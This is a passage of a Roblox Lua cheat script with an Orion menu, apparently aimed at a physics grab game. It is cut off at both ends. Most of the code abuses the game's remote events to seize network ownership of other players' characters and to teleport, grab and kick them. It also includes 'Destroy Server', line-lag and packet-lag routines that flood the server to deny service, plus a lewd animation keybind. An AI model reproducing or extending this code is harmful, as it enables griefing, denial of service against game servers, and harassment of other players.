        etc.Root = game.Players[selectedPlrName].Character and game.Players[selectedPlrName].Character:FindFirstChild("HumanoidRootPart")
        if not etc.Root then return end 

        -- Blobが存在しない場合は生成
        if not blob then 
            blob = SpawnToy("CreatureBlobman")
            if not blob then return end 
            
            local Seat = FWD(blob, "VehicleSeat")
            if Seat then
                Seat:Sit(hum)
                local start = tick()
                while not Seat.Occupant and tick() - start < 3 do
                    task.wait()
                end
            end
        end

        if not blob then return end

        local RightDetector = blob:FindFirstChild("RightDetector")
        local CreatureGrab = blob:FindFirstChild("BlobmanSeatAndOwnerScript") and blob.BlobmanSeatAndOwnerScript:FindFirstChild("CreatureGrab")
        
        if not RightDetector or not CreatureGrab then return end

        local RightWeld = RightDetector:FindFirstChild("RightWeld")

        -- ターゲットを浮かせる
        local BodyPos = Instance.new("BodyPosition")
        BodyPos.Name = "BlobSnoKickBodyPos"
        BodyPos.MaxForce = Vector3.new(math.huge, math.huge, math.huge)
        BodyPos.Position = etc.Root.Position + Vector3.new(0, 20, 0)
        BodyPos.P = 45000
        BodyPos.D = 500
        BodyPos.Parent = etc.Root

        -- SNO + 位置合わせループ
        for i = 1, 35 do
            if not hum or not hum.SeatPart or not etc.Root then break end
            
            blob:PivotTo(etc.Root.CFrame * CFrame.new(0, 5, 5))
            sno(etc.Root)
            task.wait(0.05)
        end

        -- 少し長めにSNO
        for i = 1, 12 do
            sno(etc.Root)
            task.wait(0.01)
        end

        -- 掴む処理（重要修正部分）
        task.defer(StopAllVelocity, blob)
        unsno(etc.Root)
        blob:PivotTo(etc.Root.CFrame * CFrame.new(0, 3, 0))

        -- 掴みリトライ（一番大事）
        local grabbed = false
        for i = 1, 25 do
            if RightWeld and RightWeld.Attachment0 then 
                grabbed = true
                break 
            end
            
            CreatureGrab:FireServer(RightDetector, etc.Root, RightWeld)
            task.wait(0.03)
        end

        -- 失敗しても一応もう一度
        if not grabbed then
            task.wait(0.1)
            CreatureGrab:FireServer(RightDetector, etc.Root, RightWeld)
        end

        -- 後処理
        blob:PivotTo(oldCF)
        Debris:AddItem(BodyPos, 1)

        if int.selectedButtonMode == "[BLITZ]" then  
            task.wait(0.15)
            DestroyToy:FireServer(blob)
            etc.LastBlob = nil
        end
    end    
})

ServerTab:AddSection({ Name = "<b>Destroy 1</b>"})

local selectedHeightMode = "Spawn"  -- "Spawn" or "Heaven"

-- 必要な関数（既にあれば重複しなくてOK）
local function getAllPlayers()
    local list = {}
    for _, p in ipairs(Players:GetPlayers()) do
        if p ~= plr then
            table.insert(list, p)
        end
    end
    return list
end

local function spamOwnership(targetHrp)
    if targetHrp then
        pcall(function()
            SetNetworkOwner:FireServer(targetHrp, targetHrp.CFrame)
        end)
    end
end

local function destroyLineOnPlayer(targetHrp)
    if not targetHrp then return end
    pcall(function()
        CreateGrabLine:FireServer(targetHrp, CFrame.new(0, 1e9, 0))
        task.wait()
        DestroyGrabLine:FireServer(targetHrp)
    end)
end

local lineLagEnabled = false
local lineLagThread = nil

local function startLineLag()
    if lineLagEnabled then return end
    lineLagEnabled = true
    lineLagThread = task.spawn(function()
        while lineLagEnabled do
            local spawnLoc = workspace:FindFirstChild("SpawnLocation") or workspace:FindFirstChild("Spawn") or hrp
            if spawnLoc then
                local rx = math.random(-1e9, 1e9)
                local rz = math.random(-1e9, 1e9)
                local dirs = {
                    CFrame.new(rx, 0, rz),
                    CFrame.new(-rx, 0, -rz),
                    CFrame.new(rx, 0, -rz),
                    CFrame.new(-rx, 0, rz)
                }
                for _, cf in ipairs(dirs) do
                    CreateGrabLine:FireServer(spawnLoc, cf)
                end
            end
            task.wait()
        end
    end)
end

local function stopLineLag()
    lineLagEnabled = false
end

-- UI
ServerTab:AddDropdown({
    Name = "Mode",
    Default = "Spawn",
    Options = {"Spawn", "Heaven "},
    Callback = function(Value)
        selectedHeightMode = (Value == "Heaven") and "Heaven" or "Spawn"
    end
})

ServerTab:AddButton({
    Name = "Destroy Server",
    Callback = function()
        task.spawn(function()
            local height = (selectedHeightMode == "Heaven") and 1e9 or 8
            startLineLag()
            task.wait(1)

            local players = getAllPlayers()
            if #players == 0 then
                stopLineLag()
                return
            end

            local myHrp = hrp
            if not myHrp then
                stopLineLag()
                return
            end

            local playerData = {}
            for _, p in ipairs(players) do
                local char = p.Character
                local targetHrp = char and char:FindFirstChild("HumanoidRootPart")
                if targetHrp then
                    table.insert(playerData, {plr = p, hrp = targetHrp})
                end
            end

            -- Teleport + Ownership
            for _, data in ipairs(playerData) do
                myHrp.CFrame = data.hrp.CFrame * CFrame.new(0, 5, 5)
                task.wait(0.2)
                spamOwnership(data.hrp)
            end

            -- 円形配置 + BodyPosition
            local radius = 12
            local angleStep = (math.pi * 2) / #playerData

            for idx, data in ipairs(playerData) do
                local angle = (idx - 1) * angleStep
                local x = math.cos(angle) * radius
                local z = math.sin(angle) * radius
                local targetPos = Vector3.new(x, height, z)

                pcall(function()
                    data.hrp.CFrame = CFrame.new(targetPos)
                    data.hrp.AssemblyLinearVelocity = Vector3.zero
                    data.hrp.AssemblyAngularVelocity = Vector3.zero
                    spamOwnership(data.hrp)
                end)

                pcall(function()
                    local bp = Instance.new("BodyPosition")
                    bp.Name = "ServerDestroyBP"
                    bp.P = 40000000
                    bp.D = 1000
                    bp.MaxForce = Vector3.new(1e9, 1e9, 1e9)
                    bp.Position = targetPos
                    bp.Parent = data.hrp
                    task.delay(2, function() pcall(function() bp:Destroy() end) end)
                end)

                task.wait(0.05)
            end

            -- Final line spam
            for i = 1, 8 do
                for _, data in ipairs(playerData) do
                    destroyLineOnPlayer(data.hrp)
                end
                task.wait(0.3)
            end
        end)
    end
})

ServerTab:AddButton({
    Name = "Stop Lag",
    Callback = function()
        stopLineLag()
    end
})



ServerTab:AddSection({ Name = "<b>Destroy 2</b>"})

-- Variables for Server Destroy
local selectedHeightMode = "Spawn"

local function getAllPlayers()
    local players = {}
    for _, p in ipairs(Players:GetPlayers()) do
        if p ~= plr then table.insert(players, p) end
    end
    return players
end

local function spamOwnership(hrp)
    local setOwner = RS.GrabEvents:FindFirstChild("SetNetworkOwner")
    if setOwner and hrp then
        pcall(function()
            setOwner:FireServer(hrp, hrp.CFrame)
        end)
    end
end

local function destroyLineOnPlayer(hrp)
    local create = RS.GrabEvents:FindFirstChild("CreateGrabLine")
    local destroy = RS.GrabEvents:FindFirstChild("DestroyGrabLine")
    if create and destroy then
        pcall(function()
            create:FireServer(hrp, CFrame.new(0, 1e9, 0))
            task.wait()
            destroy:FireServer(hrp)
        end)
    end
end

local function startLineLag()
    if lineLagEnabled then return end
    lineLagEnabled = true
    lineLagThread = task.spawn(function()
        local createLine = RS.GrabEvents:FindFirstChild("CreateGrabLine")
        if not createLine then return end
        while lineLagEnabled and task.wait() do
            local target = workspace:FindFirstChild("SpawnLocation") or hrp
            if target then
                for i = 1, 4 do
                    local rx = math.random(-1e9, 1e9)
                    local rz = math.random(-1e9, 1e9)
                    pcall(function()
                        createLine:FireServer(target, CFrame.new(rx, 0, rz))
                    end)
                end
            end
        end
    end)
end

local function stopLineLag()
    lineLagEnabled = false
    if lineLagThread then
        task.cancel(lineLagThread)
        lineLagThread = nil
    end
end

ServerTab:AddDropdown({
    Name = "MODE",
    Default = "Spawn",
    Options = {"Spawn", "Heaven"},
    Callback = function(Value)
        selectedHeightMode = (Value == "Heaven") and "Heaven" or "Spawn"
    end
})

ServerTab:AddButton({
    Name = "Destroy Server",
    Callback = function()
        task.spawn(function()
            local height = (selectedHeightMode == "Heaven") and 1e9 or 35
            startLineLag()
            task.wait(0.8)

            local players = getAllPlayers()
            if #players == 0 then
                stopLineLag()
                Notify("Destroy Server", "No other players found.")
                return
            end

            local myHrp = hrp
            if not myHrp then stopLineLag() return end

            local playerData = {}
            for _, p in ipairs(players) do
                local char = p.Character
                local targetHrp = char and char:FindFirstChild("HumanoidRootPart")
                if targetHrp then
                    table.insert(playerData, {plr = p, hrp = targetHrp})
                end
            end

            -- Teleport + Ownership
            for _, data in ipairs(playerData) do
                myHrp.CFrame = data.hrp.CFrame * CFrame.new(0, 5, 5)
                task.wait(0.15)
                spamOwnership(data.hrp)
            end

            -- Position players high + anchor（強化版）
            local radius = 45
            local angleStep = (math.pi * 2) / #playerData

            for idx, data in ipairs(playerData) do
                local angle = (idx - 1) * angleStep
                local x = math.cos(angle) * radius
                local z = math.sin(angle) * radius
                local targetPos = Vector3.new(x, height, z)

                pcall(function()
                    local hrp = data.hrp
                    local hum = data.plr.Character:FindFirstChildOfClass("Humanoid")

                    if hum then
                        hum.PlatformStand = true
                        hum.AutoRotate = false
                    end

                    hrp.CFrame = CFrame.new(targetPos)
                    hrp.AssemblyLinearVelocity = Vector3.zero
                    hrp.AssemblyAngularVelocity = Vector3.zero
                    spamOwnership(hrp)
                    task.wait(0.05)
                    spamOwnership(hrp)
                end)

                -- BodyPosition
                pcall(function()
                    local bp = Instance.new("BodyPosition")
                    bp.Name = "ServerDestroyBP"
                    bp.P = 100000000
                    bp.D = 1000
                    bp.MaxForce = Vector3.new(1e9, 1e9, 1e9)
                    bp.Position = targetPos
                    bp.Parent = data.hrp

                    -- 数秒間固定するやつ
                    task.spawn(function()
                        for i = 1, 80 do
                            if bp.Parent and data.hrp then
                                data.hrp.CFrame = CFrame.new(targetPos)
                                data.hrp.AssemblyLinearVelocity = Vector3.zero
                                data.hrp.AssemblyAngularVelocity = Vector3.zero
                                bp.Position = targetPos
                            end
                            task.wait(0.08)
                        end
                    end)

                    task.delay(6, function() pcall(function() bp:Destroy() end) end)
                end)

                task.wait(0.1)
            end

            for i = 1, 30 do
                for _, data in ipairs(playerData) do
                    destroyLineOnPlayer(data.hrp)
                end
                task.wait(0.2)
            end

            Notify("Server Destroy", "Attack completed. Line lag is still running.")
        end)
    end
})


ServerTab:AddButton({
    Name = "Stop Line Lag",
    Callback = function()
        stopLineLag()
        Notify("Line Lag", "Stopped.")
    end
})

local function HRP() 
    return plr.Character and plr.Character:FindFirstChild("HumanoidRootPart") 
end

local function KickAll() 
    local allPlayers = {} 
    for _, p in ipairs(Players:GetPlayers()) do 
        if p ~= plr then 
            if ExcludeFriends and plr:IsFriendsWith(p.UserId) then 
                continue 
            end 
            table.insert(allPlayers, p) 
        end 
    end

    if #allPlayers == 0 then
        OrionLib:MakeNotification({Name = "Kick All", Content = "対象プレイヤーがいません", Image = "x", Time = 3})
        return 
    end

    OrionLib:MakeNotification({Name = "Kick All", Content = "実行中... ("..#allPlayers.."人)", Image = "warning", Time = 4})

    -- Destroy Serverのラグ開始
    startLineLag()

    local rootPart = HRP()
    if rootPart then
        local spawnPos = rootPart.CFrame * CFrame.new(0, 0, -5)
        RS.MenuToys.SpawnToyRemoteFunction:InvokeServer("CreatureBlobman", spawnPos, Vector3.new(0, 127, 0))
    end
    task.wait(0.5)

    local currentBlob = workspace:FindFirstChild(plr.Name .. "SpawnedInToys") 
        and workspace:FindFirstChild(plr.Name .. "SpawnedInToys"):FindFirstChild("CreatureBlobman")

    if not currentBlob then 
        stopLineLag()
        OrionLib:MakeNotification({Name = "Kick All", Content = "Blobmanの生成に失敗", Image = "x", Time = 3})
        return 
    end

    local vehicleSeat = currentBlob:FindFirstChild("VehicleSeat")
    if vehicleSeat and plr.Character then
        vehicleSeat:Sit(plr.Character:FindFirstChildOfClass("Humanoid"))
    end
    task.wait(0.3)

    local myRoot = HRP()
    if not myRoot then 
        stopLineLag()
        return 
    end

    for _, targetPlayer in ipairs(allPlayers) do
        local targetRoot = targetPlayer.Character and targetPlayer.Character:FindFirstChild("HumanoidRootPart")
        if targetRoot then
            myRoot.CFrame = targetRoot.CFrame
            task.wait(0.02)
            for i = 1, 3 do
                pcall(function()
                    currentBlob.BlobmanSeatAndOwnerScript.CreatureGrab:FireServer(currentBlob.LeftDetector, targetRoot, currentBlob.LeftDetector.LeftWeld)
                    currentBlob.BlobmanSeatAndOwnerScript.CreatureRelease:FireServer(currentBlob.LeftDetector.LeftWeld)
                end)
                if i < 3 then task.wait(0.08) end
            end
        end
    end

    myRoot.CFrame = CFrame.new(0, 100, 0)
    task.wait(0.1)

    for _, part in ipairs(currentBlob:GetDescendants()) do
        if part:IsA("BasePart") then pcall(function() part.Anchored = true end) end
    end
    task.wait(0.1)

    local radius = 10
    for i, targetPlayer in ipairs(allPlayers) do
        local targetRoot = targetPlayer.Character and targetPlayer.Character:FindFirstChild("HumanoidRootPart")
        if targetRoot then
            local angle = math.rad((i - 1) * (360 / #allPlayers))
            local x = radius * math.cos(angle)
            local z = radius * math.sin(angle)
            targetRoot.CFrame = CFrame.new(x, 110, z)
        end
    end
    task.wait(0.1)

    for _ = 1, 2 do
        for _, targetPlayer in ipairs(allPlayers) do
            local targetRoot = targetPlayer.Character and targetPlayer.Character:FindFirstChild("HumanoidRootPart")
            if targetRoot then
                pcall(function()
                    if SetNetworkOwner then SetNetworkOwner:FireServer(targetRoot, CFrame.new(targetRoot.Position)) end
                    if DestroyGrabLine then DestroyGrabLine:FireServer(targetRoot) end
                end)
            end
        end
        task.wait(0.1)
    end
    task.wait(0.3)

    for _, targetPlayer in ipairs(allPlayers) do
        local targetRoot = targetPlayer.Character and targetPlayer.Character:FindFirstChild("HumanoidRootPart")
        if targetRoot then
            pcall(function()
                currentBlob.BlobmanSeatAndOwnerScript.CreatureGrab:FireServer(currentBlob.LeftDetector, targetRoot, currentBlob.LeftDetector.LeftWeld)
                currentBlob.BlobmanSeatAndOwnerScript.CreatureGrab:FireServer(currentBlob.RightDetector, targetRoot, currentBlob.RightDetector.RightWeld)
            end)
        end
    end

    for _, part in ipairs(currentBlob:GetDescendants()) do
        if part:IsA("BasePart") then pcall(function() part.Anchored = false end) end
    end

    OrionLib:MakeNotification({
        Name = "Kick All", 
        Content = ".", 
        Image = "check", 
        Time = 1
    })
end

ServerTab:AddSection({ Name = "<b>Blobman Kick All</b>"})

ServerTab:AddButton({ 
    Name = "Kick All [BLOB]", 
    Callback = function() 
        task.spawn(KickAll) 
    end 
})

ServerTab:AddButton({
    Name = "Stop Lag",
    Callback = function()
        stopLineLag()
        OrionLib:MakeNotification({Name = "Lag", Content = "Stop", Time = 2})
    end
})

MiscTab:AddSection({ Name = "<b>Pencill</b>"})

MiscTab:AddButton({
    Name = "Pencil Attach <font color=\"rgb(255, 215, 0)\"><b>[TORSO]</b></font>",
    Callback = function()
        pcall(function()
            local player = plr
            local character = player.Character
            if not character then return end
            
            local humanoidRootPart = character:FindFirstChild("HumanoidRootPart")
            local torso = character:FindFirstChild("Torso") or character:FindFirstChild("UpperTorso")
            
            if not torso then 
                Notify("Pencil Attach", "Torso not found!")
                return 
            end

            local spawnPosition = humanoidRootPart.Position + Vector3.new(0, 10, 0)
            
            -- Spawn Pencil
            game:GetService("ReplicatedStorage").MenuToys.SpawnToyRemoteFunction:InvokeServer(
                "ToolPencil", 
                CFrame.new(spawnPosition), 
                Vector3.new(0, 0, 0)
            )
            
            task.wait(0.35)
            
            local spawnedToys = workspace:FindFirstChild(player.Name .. "SpawnedInToys")
            if not spawnedToys then return end
            
            local toolPencil = spawnedToys:FindFirstChild("ToolPencil")
            if not toolPencil then 
                Notify("Pencil Attach", "Failed to spawn Pencil!")
                return 
            end

            local stickyPart = toolPencil:FindFirstChild("StickyPart")
            local soundPart = toolPencil:FindFirstChild("SoundPart")
            
            if stickyPart and soundPart then
                -- Network ownership
                pcall(function()
                    game:GetService("ReplicatedStorage").GrabEvents.SetNetworkOwner:FireServer(soundPart, torso.CFrame)
                end)
                
                -- Attach to torso
                game:GetService("ReplicatedStorage").PlayerEvents.StickyPartEvent:FireServer(
                    stickyPart, 
                    torso, 
                    CFrame.new(0, -1, 0, -1, 0, -8.74227766e-08, 0, 1, 0, 8.74227766e-08, 0, -1)
                )
                
                OrionLib:MakeNotification({
                    Name = "✅ Pencil Attach",
                    Content = "Pencil successfully attached to torso!",
                    Image = "rbxassetid://4483345998",
                    Time = 3
                })
            else
                Notify("Pencil Attach", "StickyPart or SoundPart not found.")
            end
        end)
    end
})

MiscTab:AddSection({ Name = "<b>Line-Lags</b>"})

    Toggles["LineAmount"] = MiscTab:AddSlider({
        Name = "Lag Amout",
        Min = 1,
        Max = 30000,
        Default = 50,
        Color = Color3.fromRGB(255,0,170),
        Increment = 100,
        ValueName = "bananas",
        Save = true,
        Flag = "LineAmount",
        Callback = function(Value)
            int.lagIntensity = Value
        end    
    })
    MiscTab:AddButton({
        Name = "Lag Server<font color=\"rgb(0, 255, 3)\"><b>[USING AMOUT]</b></font>",
        Callback = function()
            for i = 1, int.lagIntensity do  
                CreateGrabLine:FireServer(workspace.SpawnLocation,CFrame.new(workspace.SpawnLocation.Position.X, 1e9, workspace.SpawnLocation.Position.Z) * CFrame.Angles(math.rad(1e9),math.rad(1e9),math.rad(1e9)))
            end
        end    
    })

    MiscTab:AddButton({
        Name = "Line Lag<font color=\"rgb(255, 0, 0)\"><b>[DESCENDANTS]</b></font>",
        Callback = function()
            createLagWithGrabLine()
        end    
    })
    MiscTab:AddToggle({
        Name = "Just Loop-Lag",
        Default = false,
        Callback = function(Value)
            if Value then 
                cons["LAGS"] = task.spawn(function()
                    while RunService.RenderStepped:Wait() do
                        task.defer(function()
                            CreateGrabLine:FireServer(workspace.SpawnLocation, CFrame.new(0, 9e9, 0))
                            CreateGrabLine:FireServer(workspace.SpawnLocation, CFrame.new(0, 8e9, 0))
                            CreateGrabLine:FireServer(workspace.SpawnLocation, CFrame.new(0, 7e9, 0))
                            CreateGrabLine:FireServer(workspace.SpawnLocation, CFrame.new(0, 6e9, 0))
                        end)
                    end
                end)
            else 
                cons:cancel("LAGS")
            end
        end    
    })
    MiscTab:AddSection({ Name = "<b>Packets-Lags</b>"})
    local StringSize = string.len("metaballs metaballs metaballs metaballs metaballs metaballs metaballs metaballs")
    local function CalculateRepeats(Value)
        local TargetBytes = Value * 1024 * 1024
        local Repeats = math.floor(TargetBytes / 143)
        int.LagRepeats = math.max(1,Repeats)
    end
    int.RedeemPackets,int.SentPackets = 0,0
    Toggles["Redeemed"] = MiscTab:AddLabel("Redeemed packets:"..tostring(int.RedeemPackets))
    Toggles["Sent"] = MiscTab:AddLabel("Sent packets:"..tostring(int.SentPackets))
    Toggles["PacketsSize"] = MiscTab:AddSlider({
        Name = "Size of Packets to PACKET LAG",
        Min = 0.01,
        Max = 1.6,
        Default = 0.1,
        Color = Color3.fromRGB(255, 150,0),
        Increment = 0.01,
        ValueName = "MB",
        Save = true,
        Flag = "PacketsSize",
        Callback = CalculateRepeats  
    })
    MiscTab:AddToggle({
        Name = "Packet Lag Server",
        Default = false,
        Callback = function(Value)
            bool.LagPacket = Value
            while bool.LagPacket and task.wait(0.1) do
                RS.GrabEvents.ExtendGrabLine:FireServer(string.rep("metaballs metaballs metaballs metaballs metaballs metaballs metaballs metaballs",int.LagRepeats))
                int.SentPackets += 1
                Toggles["Sent"]:Set("ðð¼ Sent packets:"..tostring(int.SentPackets))
            end
        end    
    })
    MiscTab:AddToggle({
        Name = "ShurikenLagServerT",
        Default = false,
        Callback = function(Value)
            bool.ShurikenLagServerT = Value 
            if Value then 
                lag()
            end
        end    
    })
    PlrTab:AddButton({
        Name = "FindBlistUsers",
        Callback = function()
        for i,v in ipairs(workspace:GetDescendants()) do 
            if v.Name == "NinjaKunai" and v.StickyPart.StickyWeld.Part1 ~= nil then 
                local name = v.Parent.Name:gsub("SpawnedInToys$", "")
                if name == game.Players.LocalPlayer.Name then continue end 
                OrionLib:MakeNotification({
                Name = "MB found",
                Content = "[Script]: "..name,
                Image = "user-star",
                Time = 5
            })
            end
        end
        end    
    })
    
    local targetnyhrp = nil
    bool.JerkFlag = false
    local Jerk = nil
    Toggles["JerkOffKeybind"] = KeybindTab:AddBind({
        Name = "Jerk Off",
        Default = Enum.KeyCode.One,
        Hold = false,
        Save = true,
        Flag = "JerkOffKeybind",
        Callback = function()
            bool.JerkFlag = not bool.JerkFlag 
            if bool.JerkFlag then 
                local NewAnim = Instance.new("Animation")
                NewAnim.AnimationId = "rbxassetid://72042024"
                local Animator = hum:FindFirstChild("Animator")
                if not Animator then return end 
                Jerk = Animator:LoadAnimation(NewAnim)
                Jerk:Play()
                Jerk:AdjustSpeed(0.65)
                task.spawn(function()
                    while bool.JerkFlag and task.wait(0.05) do 
                        Jerk:Play()
                        Jerk.TimePosition = 0.6
                    end
                end)
            else     
                if Jerk then
                    Jerk:Stop()
                    Jerk = nil
                end
            end
        end    
    })
    
    local Gui = Instance.new("ScreenGui")
    Gui.Name = "TPGui"
    Gui.Parent = game.CoreGui
    Gui.Enabled = false

    Button = Instance.new("ImageButton")
    Button.Size = UDim2.new(0, 80, 0, 80)
    Button.Position = UDim2.new(1, -267, 1, -90)
    Button.Image = "rbxassetid://97166444"
    Button.BackgroundTransparency = 1
    Button.ImageTransparency = 0.5
    Button.Parent = Gui

    Label = Instance.new("ImageLabel")
    Label.Size = UDim2.new(0.8, 0, 0.8, 0)
    Label.Position = UDim2.new(0.1, 0, 0.1, 0)
    Label.Image = "rbxassetid://6723742952"
    Label.BackgroundTransparency = 1
    Label.Parent = Button

    Button.MouseButton1Click:Connect(function()
        if bool.TeleportKeybind then
            local MouseTarget = mouse and mouse.Target
            if MouseTarget then 
                StopVelocityF()
                hrp.CFrame = mouse.Hit * CFrame.new(0,5,0)
            end
        end
    end)

    Toggles["EnableTeleport"] =  KeybindTab:AddToggle({
        Name = "Enable Teleport Keybind",
        Default = false,
        Save = true,
        Flag = "EnableTeleport",
        Callback = function(Value)
            bool.TeleportKeybind = Value
            Gui.Enabled = game:GetService("UserInputService").TouchEnabled and Value or false
        end    
    })
    Toggles["TeleportKeybind"] = KeybindTab:AddBind({
        Name = "Teleport KeyBind",
        Default = Enum.KeyCode.X,
        Hold = false,
        Save = true,
        Flag = "TeleportKeybind",
        Callback = function()
            if bool.TeleportKeybind then
                local MouseTarget = mouse and mouse.Target
                if MouseTarget then 
                    StopVelocityF()
                    hrp.CFrame = mouse.Hit * CFrame.new(0,5,0)
                end
            end
        end    
    })
    Toggles["ShootItemVelocity"] = KeybindTab:AddSlider({
        Name = "Velocity",
        Min = 100,
        Max = 3000,
        Default = 100,
        Color = Color3.fromRGB(255,0,255),
        Increment = 100,
        ValueName = "VELOCITIES",
        Callback = function(Value)
            int.StrengthFlingBLALBLBA = Value
        end    
    })

    Toggles["ShootItemITEM"] = KeybindTab:AddDropdown({
        Name = "Item to Shoot",
        Default = "---",
        Options = {},
        Callback = function(Value)
            int.SelectedItem = Value
        end    
    })
    task.spawn(function()
        local list = {}
        for _,v in plr.PlayerGui.MenuGui.Menu.TabContents.Toys.Contents:GetChildren() do
            if v:IsA("Frame") then
                table.insert(list,v.Name)
            end
        end
        Toggles["ShootItemITEM"]:Refresh(list,true)
    end)


    Toggles["ShootItem"] = KeybindTab:AddBind({
        Name = "Shoot Item keybind",
        Default = Enum.KeyCode.Two,
        Hold = false,
        Save = true,
        Flag = "ShootItemKeybind",
        Callback = function()
            local item = SpawnToy(int.SelectedItem)
            if not item then return end 
            repeat task.wait() until item and item.PrimaryPart
            local PartToGrab
            local part = item.PrimaryPart
            for _,v in item:GetChildren() do
                if HasProperty(v, "CanQuery") and v.CanQuery and v.CanTouch then PartToGrab = v break end
            end
            if item:FindFirstChild("HumanoidCreature", true) then item:FindFirstChild("HumanoidCreature", true).Sit = true item:FindFirstChild("HumanoidCreature", true).PlatformStand = true Grab(item.LeftDetector) end
            sno(PartToGrab)
            task.wait(0.2)
            local Camera = workspace.CurrentCamera
            part.CFrame = Camera.CFrame * CFrame.new(0, 0, -8)
            part.AssemblyLinearVelocity = Camera.CFrame.LookVector * int.StrengthFlingBLALBLBA or 100
        end    
    })
    Toggles["Pose"] = KeybindTab:AddDropdown({
        Name = "LoopGrab Pose",
        Default = "[HRP]",
        Options = {"[HRP]","[DOG]"},
        Save = true,
        Flag = "Pose",
        Callback = function(Value)
            int.LoopGrabType = Value
        end    
    })
    Toggles["SpamKeybind"] =  KeybindTab:AddBind({
        Name = "Spam",
        Default = Enum.KeyCode.T,
        Hold = false,
        Save = true,
        Flag = "SpamKeybind",
        Callback = function()
        bool.LoopGrabKey = not bool.LoopGrabKey
            if bool.LoopGrabKey then 
                local PartToMaybeSpam = mouse.Target     
                int.SpamChar = PartToMaybeSpam.Parent
                local Head,Torso = int.SpamChar and int.SpamChar:FindFirstChild("Head"), int.SpamChar and int.SpamChar:FindFirstChild("Torso") 
                if Torso and Head and int.SpamChar:FindFirstChild("Humanoid") then  
                    if int.LoopGrabType == "[DOG]" then
                        cons["LoopGrabCon13"] = RunService.Heartbeat:Connect(function()
                            Torso = int.SpamChar and int.SpamChar:FindFirstChild("Torso")
                            Head = int.SpamChar and int.SpamChar:FindFirstChild("Head")
                            if not Torso or not Head then cons:disc("LoopGrabCon13") end
                            sno(Head)
                            for _,x in pairs(int.SpamChar:GetDescendants()) do 
                                if x:IsA("BasePart") then 
                                    x.CanCollide = false
                                end
                            end
                            int.SpamChar["Humanoid"].Health = 100
                            Torso.CFrame = hrp.CFrame * CFrame.new(-0,-1,-2)* CFrame.Angles(math.rad(-90), 0, math.rad(180))
                            Head.CFrame = Torso.CFrame * CFrame.new(0, 1, 0) * CFrame.Angles(math.rad(90), 0, 0)
                            if int.SpamChar:FindFirstChild("Left Arm") then 
                                int.SpamChar["Left Arm"].CFrame = Torso.CFrame * CFrame.new(-1, 0.5, 0) * CFrame.Angles(math.rad(60), 0, math.rad(-30))
                            end
                            if int.SpamChar:FindFirstChild("Right Arm") then    
                                int.SpamChar["Right Arm"].CFrame = Torso.CFrame * CFrame.new(1, 0.5, 0) * CFrame.Angles(math.rad(60), 0, math.rad(30))
                            end
                            if int.SpamChar:FindFirstChild("Left Leg") then 
                                int.SpamChar["Left Leg"].CFrame = Torso.CFrame * CFrame.new(-0.5, -1, 0) * CFrame.Angles(math.rad(40), 0, 0)
                            end
                            if int.SpamChar:FindFirstChild("Right Leg") then 
                                int.SpamChar["Right Leg"].CFrame = Torso.CFrame * CFrame.new(0.5, -1, 0) * CFrame.Angles(math.rad(40), 0, 0)
                            end
                        end)
                    elseif int.LoopGrabType == "[HRP]" then 
                        cons["LoopGrabCon13"] = RunService.Heartbeat:Connect(function()
                            Torso = int.SpamChar and int.SpamChar:FindFirstChild("Torso")
                            Head = int.SpamChar and int.SpamChar:FindFirstChild("Head")
                            if not Torso or not Head then cons:disc("LoopGrabCon13") end
                            sno(Head)
                            if CheckForPartOwner(Head) then 
                                for _,v in pairs(int.SpamChar:GetDescendants()) do 
                                    if v:IsA("BasePart") then 
                                        v.CanCollide = false 
                                        v.CFrame = hrp.CFrame * CFrame.new(0,0,-5)
                                    end
                                end
                            end
                        end)
                    end
                end
            else 
                cons:disc("LoopGrabCon13")
                if int.SpamChar and int.SpamChar.Parent and int.SpamChar:FindFirstChild("Head") then 
                    for _,v in pairs(int.SpamChar:GetChildren()) do 
                        if v:IsA("BasePart") then 
                            v.AssemblyLinearVelocity = Vector3.zero
                            v.AssemblyAngularVelocity = Vector3.zero
                            v.CanCollide = true
                        end
                    end
                end
            end
        end    
    })
    int.OutlineAnchorColor = Color3.fromRGB(0,0,255)
    int.AnchorTransp = 0
    local function CreateBodyPos1(PrimaryPart)  
        local bodyPosition = Instance.new("BodyPosition")
        local bodyGyro = Instance.new("BodyGyro")
        bodyGyro.Name = "AnchorGyro"
        bodyPosition.Name = "AnchorPos"
        bodyPosition.P = 200000
        bodyPosition.D = 1000
        bodyPosition.MaxForce = Vector3.new(Huge())
        bodyPosition.Position = PrimaryPart.Position
        bodyGyro.P = 200000
        bodyGyro.D = 1000
        bodyGyro.MaxTorque = Vector3.new(Huge())
        bodyGyro.CFrame = PrimaryPart.CFrame

        bodyGyro.Parent = PrimaryPart
        bodyPosition.Parent = PrimaryPart
        
        local Parent = PrimaryPart.Parent
        if Parent then 
            local SelectionBox = Instance.new("SelectionBox")
            SelectionBox.Parent = PrimaryPart
            SelectionBox.Adornee = Parent
            SelectionBox.LineThickness = 0.05
            SelectionBox.Color3 = int.OutlineAnchorColor
            SelectionBox.SurfaceTransparency = 1
            SelectionBox.Transparency = int.AnchorTransp
            SelectionBox.Name = "AnchorSelection"
        end
    end

    Toggles["AnchorGrabKeybind"] = KeybindTab:AddBind({
        Name = "Anchor Grab",
        Default = Enum.KeyCode.V,
        Hold = false,
        Save = true,
        Flag = "AnchorGrabKeybind",
        Callback = function()
            local GrabParts = game.workspace:FindFirstChild("GrabParts")
            if not GrabParts then return end 
            
            local GrabPart = GrabParts:WaitForChild("GrabPart", 1):WaitForChild("WeldConstraint", 1).Part1
            if not GrabPart then return end 
            
            local plrtar = GrabPart.Parent 
            local TargetPart = plrtar.PrimaryPart
            if not TargetPart then return end

            if TargetPart:FindFirstChild("AnchorPos") then 
                TargetPart:FindFirstChild("AnchorPos"):Destroy()
                TargetPart:FindFirstChild("AnchorGyro"):Destroy()
                TargetPart:FindFirstChild("AnchorSelection"):Destroy()
            else 
                CreateBodyPos1(TargetPart)
            end
        end    
    })

    Toggles["SitOnBlobKeybind"] = KeybindTab:AddBind({
        Name = "Sit on Your blob",
        Default = Enum.KeyCode.Z,
        Hold = false,
        Save = true,
        Flag = "SitOnBlobKeybind",
        Callback = function()
            local blob = nil  
            for _,v in pairs(inv:GetChildren()) do 
                if v.Name == "CreatureBlobman" then 
                    if v:FindFirstChild("HumanoidRootPart") and v["HumanoidRootPart"].Position.Y <= 1000 then  
                        blob = v  
                        break  
                    else 
                        v.Name = "IDIOTBLOB"
                    end 
                end
            end
            if blob ~= nil then  
                blob.VehicleSeat:Sit(hum)
            else 
                blob = SpawnToy("CreatureBlobman")
                repeat task.wait() until (not blob) or blob:FindFirstChild("Weight")
